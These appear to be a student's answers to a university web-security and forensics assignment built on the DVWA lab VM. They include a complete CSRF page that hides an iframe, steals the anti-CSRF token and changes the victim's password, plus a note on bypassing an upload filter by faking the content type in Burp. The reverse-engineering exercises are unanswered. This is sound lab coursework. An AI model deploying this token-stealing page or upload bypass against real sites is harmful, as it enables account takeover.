
# Part 1 - Advanced Web Exploits

> [!exercise] Exercise 1 - CSRF Token Stealing
>
> When on the high-security setting of DVWA, a unique ANTI-CSRF token is created each time the password change page is accessed, as shown in the workshop. To launch a CSRF attack in this case, we first need to steal the token. Create an HTML (name it: 'csrf.html') file that can steal the token from the DVWA CSRF page `http://[hacklabvm_ip]/DVWA/vulnerabilities/csrf` and change the password to 'csf2024s1'. You can use the template [here](https://myuni.adelaide.edu.au/courses/95262/files/14817144?wrap=1 "csrf.html"). Show the content of your csrf.html file.
>
> **Answer:**
>
> The default `html` file already does the stealing for us, we just need to add the `hacklab IP` to the `source` and `url` variables



```html
<html>

<body>
    <p>TOTALLY LEGITIMATE AND SAFE WEBSITE </p>
    <iframe id="myFrame" src="http://192.168.56.102/DVWA/vulnerabilities/csrf/" style="visibility: hidden;"
        onload="maliciousPayload()"></iframe>
    <script>
        function maliciousPayload() {
            console.log("start");
            var iframe = document.getElementById("myFrame");
            var doc = iframe.contentDocument;
            console.log(doc)
            var token = doc.getElementsByName("user_token")[0].value;
            console.log(token)
            const http = new XMLHttpRequest();
            const url = "http://192.168.56.102/DVWA/vulnerabilities/csrf/?password_new=csf2024s1&password_conf=csf2024s1&Change=Change&user_token=" + token + "#";
            http.open("GET", url);
            http.send();
            console.log("password changed");
        }
    </script>
</body>

</html>
```

> [!exercise] Exercise 2 - Uploading the CSRF File
>
> Set the DVWA security level to MEDIUM. Upload the csrf.html file to the "hackable/uploads/" folder. Provide details of the steps you use to upload the HTML file with the security level set at medium.
>
> **Answer:**
>
> This was the exact same exercise from the workshop. Since the file upload only takes images, we simply intercept the packet in burp, change the content type to `image/jpeg` and forward it! If we navigate to `<hacklab>/DVWA/hackable/uploads`, we can see the `html` file inside the directory
> 
> ![[Pasted image 20240515072304.png]]
> 
> ![[Pasted image 20240515072457.png]]



> [!exercise] Exercise 3 - Triggering the Malicious HTML
>
> **q3. [1 point]** Show that after a user visits `http://[hacklabvm_ip]/hackable/uploads/csrf.html`, the password changes to 'csf2024s1'. Explain what happened.
>
> **Answer:**
>
> [Space for answer]

## Part 2 - Digital Forensics

> [!exercise] Exercise 4 - Reversing (1)
>
> **q1. [2 points]** Download this [binary](https://myuni.adelaide.edu.au/courses/95262/files/14689600/download?download_frd=1). You can run it as `./q1` in Linux. You are not allowed to patch this program. Use Ghidra, Cutter, or Radare2 (or something else) to decompile and deduce the password required for revealing the secret. Get the program to print the secret.
>
> **Answer:**
>
> [Space for answer]

> [!exercise] Exercise 5 - Reversing (2)
>
> **q2. [2 points]** Download this [binary](https://myuni.adelaide.edu.au/courses/95262/files/14689602/download?download_frd=1). You can run it as `./q2` in Linux. You are not allowed to patch this program. Use Ghidra/Cutter/Radare2 to determine what you need to do outside of the program to get it to reveal the secret. Get the program to print the secret.
>
> **Answer:**
>
> [Space for answer]

> [!exercise] Exercise 6 - Reversing (3)
>
> **q3. [2 points]** Download this [binary](https://myuni.adelaide.edu.au/courses/95262/files/14689603/download?download_frd=1). You can run it as `./q3` in Linux. You should patch this program to get it to reveal the secret using Ghidra/Cutter/Radare2 (as per workshop, Cutter is easiest, but feel free to use any program). Use the modified (patched) program to print the secret.
>
> **Answer:**
>
> [Space for answer]

> [!exercise] Exercise 7 - Matryoshka
>
> **q4. [3 points]** Analyze this [Hacktivist2-2.png](https://myuni.adelaide.edu.au/courses/95262/files/14689604/download?download_frd=1) to get the secret.
>
> **Answer:**
>
> [Space for answer]